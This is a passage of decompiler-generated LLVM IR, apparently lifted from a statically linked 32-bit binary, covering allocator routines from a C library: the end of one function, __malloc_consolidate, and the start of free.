  %v0_8050d9e = load i32, i32* %esi.global-to-local, align 4
  %v1_8050d9e = or i32 %v0_8050d9e, 1
  store i32 %v1_8050d9e, i32* %esi.global-to-local, align 4
  %v1_8050da1 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050da1 = add i32 %v1_8050da1, 4
  %v3_8050da1 = inttoptr i32 %v2_8050da1 to i32*
  store i32 %v1_8050d9e, i32* %v3_8050da1, align 4
  br label %dec_label_pc_8050dad

dec_label_pc_8050dab:                             ; preds = %dec_label_pc_8050d8d, %dec_label_pc_8050d6e, %dec_label_pc_8050d56, %entry
  br label %dec_label_pc_8050dad

dec_label_pc_8050dad:                             ; preds = %dec_label_pc_8050d93, %dec_label_pc_8050dab
  %storemerge = phi i32 [ 1, %dec_label_pc_8050d93 ], [ 0, %dec_label_pc_8050dab ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8050d2c, i32* %esi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8050d80, { 1, 0, 2 }
  uselistorder i32 %v4_8050d4f, { 1, 2, 0 }
  uselistorder i32 %v3_8050d31, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_8050d29, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8050dad, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_8050db6 = load i32, i32* @edi, align 4
  %v0_8050db7 = load i32, i32* @esi, align 4
  %v0_8050db8 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_8050dc0 = load i32, i32* %arg1, align 4
  store i32 %v2_8050dc0, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8050dc7 = icmp eq i32 %v2_8050dc0, 0
  br i1 %v1_8050dc7, label %dec_label_pc_8050ef0.preheader, label %dec_label_pc_8050dcf

dec_label_pc_8050ef0.preheader:                   ; preds = %entry
  %v3_8050ee5 = add i32 %tmp11, 44
  br label %dec_label_pc_8050ee1

dec_label_pc_8050dcf:                             ; preds = %entry
  %v1_8050dd3 = and i32 %v2_8050dc0, -3
  store i32 %v1_8050dd3, i32* %arg1, align 4
  %v1_8050dd8 = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_8050de7 = add i32 %tmp11, 4
  store i32 %v1_8050de7, i32* %eax.global-to-local, align 4
  %v2_8050dee = load i32, i32* %arg1, align 4
  %v2_8050df4 = udiv i32 %v2_8050dee, 8
  %v2_8050df7 = mul nuw i32 %v2_8050df4, 4
  %v3_8050df7 = add i32 %tmp11, -4
  %v4_8050df7 = add i32 %v3_8050df7, %v2_8050df7
  store i32 %v4_8050df7, i32* %eax.global-to-local, align 4
  %v2_8050ebe = add i32 %tmp11, 44
  %v3_8050ebe = inttoptr i32 %v2_8050ebe to i32*
  %v1_8050e91 = add i32 %tmp11, 60
  %v2_8050e91 = inttoptr i32 %v1_8050e91 to i32*
  br label %dec_label_pc_8050dff

dec_label_pc_8050dff:                             ; preds = %dec_label_pc_8050ed7, %dec_label_pc_8050dcf
  %v0_8050e0d = phi i32 [ %v1_8050de7, %dec_label_pc_8050dcf ], [ %v4_8050ed7, %dec_label_pc_8050ed7 ]
  store i32 %v0_8050e0d, i32* %eax.global-to-local, align 4
  %v1_8050e03 = inttoptr i32 %v0_8050e0d to i32*
  %v2_8050e03 = load i32, i32* %v1_8050e03, align 4
  store i32 %v2_8050e03, i32* @ecx, align 4
  %v1_8050e05 = icmp eq i32 %v2_8050e03, 0
  br i1 %v1_8050e05, label %dec_label_pc_8050ecd, label %dec_label_pc_8050e0d

dec_label_pc_8050e0d:                             ; preds = %dec_label_pc_8050dff
  store i32 0, i32* %v1_8050e03, align 4
  %v0_8050e13.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8050e13

dec_label_pc_8050e13:                             ; preds = %dec_label_pc_8050ec1, %dec_label_pc_8050e0d
  %v0_8050e30 = phi i32 [ %v3_8050e13, %dec_label_pc_8050ec1 ], [ %v0_8050e13.pre, %dec_label_pc_8050e0d ]
  %v1_8050e13 = add i32 %v0_8050e30, 8
  %v2_8050e13 = inttoptr i32 %v1_8050e13 to i32*
  %v3_8050e13 = load i32, i32* %v2_8050e13, align 4
  store i32 %v3_8050e13, i32* %edx.global-to-local, align 4
  %v1_8050e1a = add i32 %v0_8050e30, 4
  %v2_8050e1a = inttoptr i32 %v1_8050e1a to i32*
  %v3_8050e1a = load i32, i32* %v2_8050e1a, align 4
  store i32 %v3_8050e1a, i32* %eax.global-to-local, align 4
  %v1_8050e1f = and i32 %v3_8050e1a, -2
  store i32 %v1_8050e1f, i32* @edi, align 4
  %v2_8050e22 = urem i32 %v3_8050e1a, 2
  %v3_8050e22 = icmp eq i32 %v2_8050e22, 0
  %v2_8050e24 = add i32 %v1_8050e1f, %v0_8050e30
  store i32 %v2_8050e24, i32* @ebx, align 4
  %v1_8050e27 = add i32 %v2_8050e24, 4
  %v2_8050e27 = inttoptr i32 %v1_8050e27 to i32*
  %v3_8050e27 = load i32, i32* %v2_8050e27, align 4
  store i32 %v3_8050e27, i32* %edx.global-to-local, align 4
  %v1_8050e2e = icmp eq i1 %v3_8050e22, false
  br i1 %v1_8050e2e, label %dec_label_pc_8050e50, label %dec_label_pc_8050e30

dec_label_pc_8050e30:                             ; preds = %dec_label_pc_8050e13
  %v1_8050e30 = inttoptr i32 %v0_8050e30 to i32*
  %v2_8050e30 = load i32, i32* %v1_8050e30, align 4
  store i32 %v2_8050e30, i32* %ebp.global-to-local, align 4
  %v2_8050e34 = sub i32 %v0_8050e30, %v2_8050e30
  store i32 %v2_8050e34, i32* %eax.global-to-local, align 4
  %v1_8050e36 = add i32 %v2_8050e34, 8
  %v2_8050e36 = inttoptr i32 %v1_8050e36 to i32*
  %v3_8050e36 = load i32, i32* %v2_8050e36, align 4
  store i32 %v3_8050e36, i32* @esi, align 4
  %v1_8050e39 = add i32 %v2_8050e34, 12
  %v2_8050e39 = inttoptr i32 %v1_8050e39 to i32*
  %v3_8050e39 = load i32, i32* %v2_8050e39, align 4
  store i32 %v3_8050e39, i32* %edx.global-to-local, align 4
  %v1_8050e3c = add i32 %v3_8050e36, 12
  %v2_8050e3c = inttoptr i32 %v1_8050e3c to i32*
  %v3_8050e3c = load i32, i32* %v2_8050e3c, align 4
  store i32 %v3_8050e3c, i32* @ecx, align 4
  %v12_8050e3f = icmp eq i32 %v3_8050e3c, %v2_8050e34
  %v1_8050e41 = icmp eq i1 %v12_8050e3f, false
  br i1 %v1_8050e41, label %dec_label_pc_8050e80, label %dec_label_pc_8050e43

dec_label_pc_8050e43:                             ; preds = %dec_label_pc_8050e30
  %v1_8050e43 = add i32 %v3_8050e39, 8
  %v2_8050e43 = inttoptr i32 %v1_8050e43 to i32*
  %v3_8050e43 = load i32, i32* %v2_8050e43, align 4
  %v15_8050e43 = icmp eq i32 %v3_8050e43, %v3_8050e3c
  %v1_8050e46 = icmp eq i1 %v15_8050e43, false
  br i1 %v1_8050e46, label %dec_label_pc_8050e80, label %dec_label_pc_8050e48

dec_label_pc_8050e48:                             ; preds = %dec_label_pc_8050e43
  %v2_8050e48 = add i32 %v2_8050e30, %v1_8050e1f
  store i32 %v2_8050e48, i32* @edi, align 4
  store i32 %v3_8050e39, i32* %v2_8050e3c, align 4
  %v0_8050e4d = load i32, i32* @esi, align 4
  %v1_8050e4d = load i32, i32* %edx.global-to-local, align 4
  %v2_8050e4d = add i32 %v1_8050e4d, 8
  %v3_8050e4d = inttoptr i32 %v2_8050e4d to i32*
  store i32 %v0_8050e4d, i32* %v3_8050e4d, align 4
  %v0_8050e5b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050e50

dec_label_pc_8050e50:                             ; preds = %dec_label_pc_8050e13, %dec_label_pc_8050e48
  %v1_8050e64 = phi i32 [ %v2_8050e24, %dec_label_pc_8050e13 ], [ %v0_8050e5b.pre, %dec_label_pc_8050e48 ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8050e58 = and i32 %v3_8050e27, -4
  store i32 %v1_8050e58, i32* %ebp.global-to-local, align 4
  %v4_8050e5b = load i32, i32* %v3_8050ebe, align 4
  %v15_8050e5b = icmp eq i32 %v1_8050e64, %v4_8050e5b
  br i1 %v15_8050e5b, label %dec_label_pc_8050eb1, label %dec_label_pc_8050e60

dec_label_pc_8050e60:                             ; preds = %dec_label_pc_8050e50
  %v2_8050e60 = add i32 %v1_8050e64, 4
  %v3_8050e60 = add i32 %v2_8050e60, %v1_8050e58
  %v4_8050e60 = inttoptr i32 %v3_8050e60 to i32*
  %v5_8050e60 = load i32, i32* %v4_8050e60, align 4
  store i32 %v5_8050e60, i32* %eax.global-to-local, align 4
  %v3_8050e64 = inttoptr i32 %v2_8050e60 to i32*
  store i32 %v1_8050e58, i32* %v3_8050e64, align 4
  %v0_8050e67 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e67 = urem i32 %v0_8050e67, 2
  %v2_8050e67 = icmp eq i32 %v1_8050e67, 0
  store i32 %v1_8050e67, i32* %eax.global-to-local, align 4
  %v1_8050e6c = icmp eq i1 %v2_8050e67, false
  br i1 %v1_8050e6c, label %dec_label_pc_8050e8d, label %dec_label_pc_8050e6e

dec_label_pc_8050e6e:                             ; preds = %dec_label_pc_8050e60
  %v0_8050e6e = load i32, i32* @ebx, align 4
  %v1_8050e6e = add i32 %v0_8050e6e, 8
  %v2_8050e6e = inttoptr i32 %v1_8050e6e to i32*
  %v3_8050e6e = load i32, i32* %v2_8050e6e, align 4
  store i32 %v3_8050e6e, i32* @edx, align 4
  %v1_8050e71 = add i32 %v0_8050e6e, 12
  %v2_8050e71 = inttoptr i32 %v1_8050e71 to i32*
  %v3_8050e71 = load i32, i32* %v2_8050e71, align 4
  store i32 %v3_8050e71, i32* %eax.global-to-local, align 4
  %v1_8050e74 = add i32 %v3_8050e6e, 12
  %v2_8050e74 = inttoptr i32 %v1_8050e74 to i32*
  %v3_8050e74 = load i32, i32* %v2_8050e74, align 4
  store i32 %v3_8050e74, i32* @esi, align 4
  %v12_8050e77 = icmp eq i32 %v3_8050e74, %v0_8050e6e
  %v1_8050e79 = icmp eq i1 %v12_8050e77, false
  br i1 %v1_8050e79, label %dec_label_pc_8050e80, label %dec_label_pc_8050e7b

dec_label_pc_8050e7b:                             ; preds = %dec_label_pc_8050e6e
  %v1_8050e7b = add i32 %v3_8050e71, 8
  %v2_8050e7b = inttoptr i32 %v1_8050e7b to i32*
  %v3_8050e7b = load i32, i32* %v2_8050e7b, align 4
  %v15_8050e7b = icmp eq i32 %v3_8050e7b, %v3_8050e74
  br i1 %v15_8050e7b, label %dec_label_pc_8050e85, label %dec_label_pc_8050e80

dec_label_pc_8050e80:                             ; preds = %dec_label_pc_8050e7b, %dec_label_pc_8050e6e, %dec_label_pc_8050e43, %dec_label_pc_8050e30
  %v0_8050e80 = call i32 @abort()
  store i32 %v0_8050e80, i32* %eax.global-to-local, align 4
  %v1_8050e87.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050e85

dec_label_pc_8050e85:                             ; preds = %dec_label_pc_8050e7b, %dec_label_pc_8050e80
  %v1_8050e87 = phi i32 [ %v3_8050e6e, %dec_label_pc_8050e7b ], [ %v1_8050e87.pre, %dec_label_pc_8050e80 ]
  %v0_8050e87 = phi i32 [ %v3_8050e71, %dec_label_pc_8050e7b ], [ %v0_8050e80, %dec_label_pc_8050e80 ]
  %v0_8050e85 = load i32, i32* @edi, align 4
  %v1_8050e85 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050e85 = add i32 %v1_8050e85, %v0_8050e85
  store i32 %v2_8050e85, i32* @edi, align 4
  %v2_8050e87 = add i32 %v1_8050e87, 12
  %v3_8050e87 = inttoptr i32 %v2_8050e87 to i32*
  store i32 %v0_8050e87, i32* %v3_8050e87, align 4
  %v0_8050e8a = load i32, i32* @edx, align 4
  %v1_8050e8a = load i32, i32* %eax.global-to-local, align 4
  %v2_8050e8a = add i32 %v1_8050e8a, 8
  %v3_8050e8a = inttoptr i32 %v2_8050e8a to i32*
  store i32 %v0_8050e8a, i32* %v3_8050e8a, align 4
  br label %dec_label_pc_8050e8d

dec_label_pc_8050e8d:                             ; preds = %dec_label_pc_8050e60, %dec_label_pc_8050e85
  store i32 %v1_8050dd8, i32* %eax.global-to-local, align 4
  %v3_8050e91 = load i32, i32* %v2_8050e91, align 4
  store i32 %v3_8050e91, i32* @edx, align 4
  %v0_8050e94 = load i32, i32* @ecx, align 4
  store i32 %v0_8050e94, i32* %v2_8050e91, align 4
  %v0_8050e97 = load i32, i32* @edi, align 4
  %v1_8050e99 = or i32 %v0_8050e97, 1
  %v1_8050e9c = load i32, i32* @ecx, align 4
  %v2_8050e9c = add i32 %v1_8050e9c, 4
  %v3_8050e9c = inttoptr i32 %v2_8050e9c to i32*
  store i32 %v1_8050e99, i32* %v3_8050e9c, align 4
  %v0_8050e9f = load i32, i32* @ecx, align 4
  %v1_8050e9f = load i32, i32* @edx, align 4
  %v2_8050e9f = add i32 %v1_8050e9f, 12
  %v3_8050e9f = inttoptr i32 %v2_8050e9f to i32*
  store i32 %v0_8050e9f, i32* %v3_8050e9f, align 4
  store i32 %v1_8050dd8, i32* %eax.global-to-local, align 4
  %v0_8050ea6 = load i32, i32* @edx, align 4
  %v1_8050ea6 = load i32, i32* @ecx, align 4
  %v2_8050ea6 = add i32 %v1_8050ea6, 8
  %v3_8050ea6 = inttoptr i32 %v2_8050ea6 to i32*
  store i32 %v0_8050ea6, i32* %v3_8050ea6, align 4
  %v0_8050ea9 = load i32, i32* @edi, align 4
  %v1_8050ea9 = load i32, i32* @ecx, align 4
  %v3_8050ea9 = add i32 %v1_8050ea9, %v0_8050ea9
  %v4_8050ea9 = inttoptr i32 %v3_8050ea9 to i32*
  store i32 %v0_8050ea9, i32* %v4_8050ea9, align 4
  %v0_8050eac = load i32, i32* %eax.global-to-local, align 4
  %v1_8050eac = load i32, i32* @ecx, align 4
  %v2_8050eac = add i32 %v1_8050eac, 12
  %v3_8050eac = inttoptr i32 %v2_8050eac to i32*
  store i32 %v0_8050eac, i32* %v3_8050eac, align 4
  br label %dec_label_pc_8050ec1

dec_label_pc_8050eb1:                             ; preds = %dec_label_pc_8050e50
  %v0_8050eb1 = load i32, i32* @edi, align 4
  %v2_8050eb1 = add i32 %v0_8050eb1, %v1_8050e58
  %v1_8050eb4 = or i32 %v2_8050eb1, 1
  store i32 %v1_8050eb4, i32* %eax.global-to-local, align 4
  %v1_8050eb7 = load i32, i32* @ecx, align 4
  %v2_8050eb7 = add i32 %v1_8050eb7, 4
  %v3_8050eb7 = inttoptr i32 %v2_8050eb7 to i32*
  store i32 %v1_8050eb4, i32* %v3_8050eb7, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_8050ebe = load i32, i32* @ecx, align 4
  store i32 %v0_8050ebe, i32* %v3_8050ebe, align 4
  br label %dec_label_pc_8050ec1

dec_label_pc_8050ec1:                             ; preds = %dec_label_pc_8050e8d, %dec_label_pc_8050eb1
  store i32 %v3_8050e13, i32* @ecx, align 4
  %v1_8050ec5 = icmp eq i32 %v3_8050e13, 0
  %v1_8050ec7 = icmp eq i1 %v1_8050ec5, false
  br i1 %v1_8050ec7, label %dec_label_pc_8050e13, label %dec_label_pc_8050ecd

dec_label_pc_8050ecd:                             ; preds = %dec_label_pc_8050ec1, %dec_label_pc_8050dff
  store i32 %v4_8050df7, i32* @ecx, align 4
  %v15_8050ed1 = icmp eq i32 %v0_8050e0d, %v4_8050df7
  br i1 %v15_8050ed1, label %dec_label_pc_8050f55, label %dec_label_pc_8050ed7

dec_label_pc_8050ed7:                             ; preds = %dec_label_pc_8050ecd
  %v4_8050ed7 = add i32 %v0_8050e0d, 4
  br label %dec_label_pc_8050dff

dec_label_pc_8050ee1:                             ; preds = %dec_label_pc_8050ef0.preheader, %dec_label_pc_8050ee1
  %v1_8050ee520 = phi i32 [ 1, %dec_label_pc_8050ef0.preheader ], [ %v0_8050ef0.pre, %dec_label_pc_8050ee1 ]
  %v2_8050ee5 = mul i32 %v1_8050ee520, 8
  %v4_8050ee5 = add i32 %v3_8050ee5, %v2_8050ee5
  store i32 %v4_8050ee5, i32* %eax.global-to-local, align 4
  %v1_8050ee9 = add i32 %v1_8050ee520, 1
  store i32 %v1_8050ee9, i32* %edx.global-to-local, align 4
  %v2_8050eea = add i32 %v4_8050ee5, 12
  %v3_8050eea = inttoptr i32 %v2_8050eea to i32*
  store i32 %v4_8050ee5, i32* %v3_8050eea, align 4
  %v0_8050eed = load i32, i32* %eax.global-to-local, align 4
  %v2_8050eed = add i32 %v0_8050eed, 8
  %v3_8050eed = inttoptr i32 %v2_8050eed to i32*
  store i32 %v0_8050eed, i32* %v3_8050eed, align 4
  %v0_8050ef0.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_8050ef3 = icmp sgt i32 %v0_8050ef0.pre, 95
  br i1 %v7_8050ef3, label %dec_label_pc_8050ef5, label %dec_label_pc_8050ee1

dec_label_pc_8050ef5:                             ; preds = %dec_label_pc_8050ee1
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8050ef9 = add i32 %tmp11, 864
  %v2_8050ef9 = inttoptr i32 %v1_8050ef9 to i32*
  %v3_8050ef9 = load i32, i32* %v2_8050ef9, align 4
  %v4_8050ef9 = or i32 %v3_8050ef9, 1
  store i32 %v4_8050ef9, i32* %v2_8050ef9, align 4
  %v0_8050f00 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050f00 = add i32 %v0_8050f00, 840
  %v2_8050f00 = inttoptr i32 %v1_8050f00 to i32*
  store i32 0, i32* %v2_8050f00, align 4
  %v0_8050f0a = load i32, i32* %eax.global-to-local, align 4
  %v1_8050f0a = add i32 %v0_8050f0a, 852
  %v2_8050f0a = inttoptr i32 %v1_8050f0a to i32*
  store i32 65536, i32* %v2_8050f0a, align 4
  %v0_8050f14 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050f14 = add i32 %v0_8050f14, 844
  %v2_8050f14 = inttoptr i32 %v1_8050f14 to i32*
  store i32 262144, i32* %v2_8050f14, align 4
  %v0_8050f1e = load i32, i32* %eax.global-to-local, align 4
  %v1_8050f1e = add i32 %v0_8050f1e, 836
  %v2_8050f1e = inttoptr i32 %v1_8050f1e to i32*
  store i32 262144, i32* %v2_8050f1e, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_8050f2f = load i32, i32* %arg1, align 4
  %v1_8050f31 = urem i32 %v2_8050f2f, 4
  %v1_8050f34 = or i32 %v1_8050f31, 72
  store i32 %v1_8050f34, i32* %arg1, align 4
  %v0_8050f39 = load i32, i32* @edx, align 4
  %v1_8050f3b = add i32 %v0_8050f39, 52
  store i32 %v1_8050f3b, i32* %eax.global-to-local, align 4
  %v2_8050f3e = add i32 %v0_8050f39, 44
  %v3_8050f3e = inttoptr i32 %v2_8050f3e to i32*
  store i32 %v1_8050f3b, i32* %v3_8050f3e, align 4
  %v1_8050f43 = call i32 @sysconf(i32 30)
  store i32 %v1_8050f43, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_8050f4f = add i32 %tmp11, 860
  %v3_8050f4f = inttoptr i32 %v2_8050f4f to i32*
  store i32 %v1_8050f43, i32* %v3_8050f4f, align 4
  br label %dec_label_pc_8050f55

dec_label_pc_8050f55:                             ; preds = %dec_label_pc_8050ecd, %dec_label_pc_8050ef5
  store i32 %v0_8050db8, i32* @ebx, align 4
  store i32 %v0_8050db7, i32* @esi, align 4
  store i32 %v0_8050db6, i32* @edi, align 4
  %v0_8050f5c = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8050f5c

; uselistorder directives
  uselistorder i32 %v0_8050eed, { 1, 0 }
  uselistorder i32 %v0_8050ea9, { 1, 0 }
  uselistorder i32 %v1_8050e67, { 1, 0 }
  uselistorder i32 %v2_8050e60, { 1, 0 }
  uselistorder i32 %v1_8050e58, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8050e64, { 1, 0 }
  uselistorder i32 %v3_8050e13, { 2, 1, 3, 0 }
  uselistorder i32 %v0_8050e30, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8050e0d, { 1, 0, 3, 2 }
  uselistorder i32* %v3_8050ebe, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 19, 20, 21, 23, 24, 25, 26 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_8050f55, { 1, 0 }
  uselistorder label %dec_label_pc_8050ee1, { 1, 0 }
  uselistorder label %dec_label_pc_8050ec1, { 1, 0 }
  uselistorder label %dec_label_pc_8050e8d, { 1, 0 }
  uselistorder label %dec_label_pc_8050e85, { 1, 0 }
  uselistorder label %dec_label_pc_8050e50, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8050f5d = load i32, i32* @ebp, align 4
  %v0_8050f5e = load i32, i32* @edi, align 4
  %v0_8050f5f = load i32, i32* @esi, align 4
  %v0_8050f60 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8050f68 = icmp eq i32 %arg1, 0
  br i1 %v1_8050f68, label %dec_label_pc_80510f1, label %dec_label_pc_8050f70

dec_label_pc_8050f70:                             ; preds = %entry
  %v2_8050f7b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050f7b, i32* @eax, align 4
  %v2_8050f80 = call i32 @__pthread_return_void(i32 %v2_8050f7b, i32 134552351)
  store i32 %v2_8050f80, i32* %eax.global-to-local, align 4
  %v1_8050f8c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059f30.187 to i32))
  %v1_8050f91 = add i32 %arg1, -8
  store i32 %v1_8050f91, i32* @ecx, align 4
  %v0_8050f94 = load i8, i8* @global_var_80603a0.188, align 1
  %v1_8050f94 = sext i8 %v0_8050f94 to i32
  store i32 %v1_8050f94, i32* %eax.global-to-local, align 4
  %v1_8050f99 = add i32 %arg1, -4
  %v2_8050f99 = inttoptr i32 %v1_8050f99 to i32*
  %v3_8050f99 = load i32, i32* %v2_8050f99, align 4
  store i32 %v3_8050f99, i32* @edx, align 4
  %v1_8050fa1 = and i32 %v3_8050f99, -4
  %v4_8050fa1 = trunc i32 %v1_8050fa1 to i8
  store i32 %v1_8050fa1, i32* @ebx, align 4
  %v8_8050fa6 = icmp ugt i8 %v4_8050fa1, %v0_8050f94
  br i1 %v8_8050fa6, label %dec_label_pc_8050fc8, label %dec_label_pc_8050fa8

dec_label_pc_8050fa8:                             ; preds = %dec_label_pc_8050f70
  %v1_8050fa8 = or i32 %v1_8050f94, 3
  %v3_8050fa8 = trunc i32 %v1_8050fa8 to i8
  store i32 %v1_8050fa8, i32* %eax.global-to-local, align 4
  %v2_8050fab = udiv i32 %v3_8050f99, 8
  store i8 %v3_8050fa8, i8* @global_var_80603a0.188, align 32
  %v1_8050fb3 = mul nuw i32 %v2_8050fab, 4
  %v2_8050fb3 = add i32 %v1_8050fb3, ptrtoint (i8* @global_var_80603a0.188 to i32)
  store i32 %v2_8050fb3, i32* @edx, align 4
  %v1_8050fba = add i32 %v1_8050fb3, add (i32 ptrtoint (i8* @global_var_80603a0.188 to i32), i32 -4)
  %v2_8050fba = inttoptr i32 %v1_8050fba to i32*
  %v3_8050fba = load i32, i32* %v2_8050fba, align 4
  store i32 %v3_8050fba, i32* %eax.global-to-local, align 4
  %v3_8050fbd = inttoptr i32 %arg1 to i32*
  store i32 %v3_8050fba, i32* %v3_8050fbd, align 4
  %v0_8050fc0 = load i32, i32* @ecx, align 4
  %v1_8050fc0 = load i32, i32* @edx, align 4
  %v2_8050fc0 = add i32 %v1_8050fc0, -4
  %v3_8050fc0 = inttoptr i32 %v2_8050fc0 to i32*
  store i32 %v0_8050fc0, i32* %v3_8050fc0, align 4
  br label %dec_label_pc_80510e0

dec_label_pc_8050fc8:                             ; preds = %dec_label_pc_8050f70
  %v2_8050fc8 = and i32 %v3_8050f99, 2
  %v3_8050fc8 = icmp eq i32 %v2_8050fc8, 0
  %v1_8050fcb = icmp eq i1 %v3_8050fc8, false
  br i1 %v1_8050fcb, label %dec_label_pc_80510c0, label %dec_label_pc_8050fd1

dec_label_pc_8050fd1:                             ; preds = %dec_label_pc_8050fc8
  %v1_8050fd1 = or i32 %v1_8050f94, 1
  %v3_8050fd1 = trunc i32 %v1_8050fd1 to i8
  store i32 %v1_8050fd1, i32* %eax.global-to-local, align 4
  store i8 %v3_8050fd1, i8* @global_var_80603a0.188, align 32
  %v2_8050fd9 = add i32 %v1_8050fa1, %v1_8050f91
  store i32 %v2_8050fd9, i32* @esi, align 4
  %v1_8050fdc = add i32 %v2_8050fd9, 4
  %v2_8050fdc = inttoptr i32 %v1_8050fdc to i32*
  %v3_8050fdc = load i32, i32* %v2_8050fdc, align 4
  store i32 %v3_8050fdc, i32* %eax.global-to-local, align 4
  %v2_8050fe3 = inttoptr i32 %v1_8050f99 to i8*
  %v3_8050fe3 = load i8, i8* %v2_8050fe3, align 1
  %v4_8050fe3 = urem i8 %v3_8050fe3, 2
  %v5_8050fe3 = icmp eq i8 %v4_8050fe3, 0
  %v1_8050fe7 = icmp eq i1 %v5_8050fe3, false
  br i1 %v1_8050fe7, label %dec_label_pc_805100a, label %dec_label_pc_8050fe9

dec_label_pc_8050fe9:                             ; preds = %dec_label_pc_8050fd1
  %v2_8050fe9 = inttoptr i32 %v1_8050f91 to i32*
  %v3_8050fe9 = load i32, i32* %v2_8050fe9, align 4
  store i32 %v3_8050fe9, i32* @ebp, align 4
  %v2_8050fee = sub i32 %v1_8050f91, %v3_8050fe9
  store i32 %v2_8050fee, i32* %eax.global-to-local, align 4
  %v1_8050ff0 = add i32 %v2_8050fee, 8
  %v2_8050ff0 = inttoptr i32 %v1_8050ff0 to i32*
  %v3_8050ff0 = load i32, i32* %v2_8050ff0, align 4
  store i32 %v3_8050ff0, i32* @edi, align 4
  %v1_8050ff3 = add i32 %v2_8050fee, 12
  %v2_8050ff3 = inttoptr i32 %v1_8050ff3 to i32*
  %v3_8050ff3 = load i32, i32* %v2_8050ff3, align 4
  store i32 %v3_8050ff3, i32* @edx, align 4
  %v1_8050ff6 = add i32 %v3_8050ff0, 12
  %v2_8050ff6 = inttoptr i32 %v1_8050ff6 to i32*
  %v3_8050ff6 = load i32, i32* %v2_8050ff6, align 4
  store i32 %v3_8050ff6, i32* @ecx, align 4
  %v12_8050ff9 = icmp eq i32 %v3_8050ff6, %v2_8050fee
  %v1_8050ffb = icmp eq i1 %v12_8050ff9, false
  br i1 %v1_8050ffb, label %dec_label_pc_8051039, label %dec_label_pc_8050ffd

dec_label_pc_8050ffd:                             ; preds = %dec_label_pc_8050fe9
  %v1_8050ffd = add i32 %v3_8050ff3, 8
  %v2_8050ffd = inttoptr i32 %v1_8050ffd to i32*
  %v3_8050ffd = load i32, i32* %v2_8050ffd, align 4
  %v15_8050ffd = icmp eq i32 %v3_8050ffd, %v3_8050ff6
  %v1_8051000 = icmp eq i1 %v15_8050ffd, false
  br i1 %v1_8051000, label %dec_label_pc_8051039, label %dec_label_pc_8051002

dec_label_pc_8051002:                             ; preds = %dec_label_pc_8050ffd
  %v2_8051002 = add i32 %v3_8050fe9, %v1_8050fa1
  store i32 %v2_8051002, i32* @ebx, align 4
  store i32 %v3_8050ff3, i32* %v2_8050ff6, align 4
  %v0_8051007 = load i32, i32* @edi, align 4
  %v1_8051007 = load i32, i32* @edx, align 4
  %v2_8051007 = add i32 %v1_8051007, 8
  %v3_8051007 = inttoptr i32 %v2_8051007 to i32*
  store i32 %v0_8051007, i32* %v3_8051007, align 4
  %v0_8051011.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805100a

dec_label_pc_805100a:                             ; preds = %dec_label_pc_8050fd1, %dec_label_pc_8051002
  %v1_805101d = phi i32 [ %v2_8050fd9, %dec_label_pc_8050fd1 ], [ %v0_8051011.pre, %dec_label_pc_8051002 ]
  %v1_805100e = and i32 %v3_8050fdc, -4
  store i32 %v1_805100e, i32* @ebp, align 4
  %v1_8051011 = load i32, i32* @global_var_80603cc.189, align 4
  %v12_8051011 = icmp eq i32 %v1_805101d, %v1_8051011
  br i1 %v12_8051011, label %dec_label_pc_805106b, label %dec_label_pc_8051019

dec_label_pc_8051019:                             ; preds = %dec_label_pc_805100a
  %v2_8051019 = add i32 %v1_805101d, 4
  %v3_8051019 = add i32 %v2_8051019, %v1_805100e
  %v4_8051019 = inttoptr i32 %v3_8051019 to i32*
  %v5_8051019 = load i32, i32* %v4_8051019, align 4
  store i32 %v5_8051019, i32* %eax.global-to-local, align 4
  %v3_805101d = inttoptr i32 %v2_8051019 to i32*
  store i32 %v1_805100e, i32* %v3_805101d, align 4
  %v0_8051020 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051020 = urem i32 %v0_8051020, 2
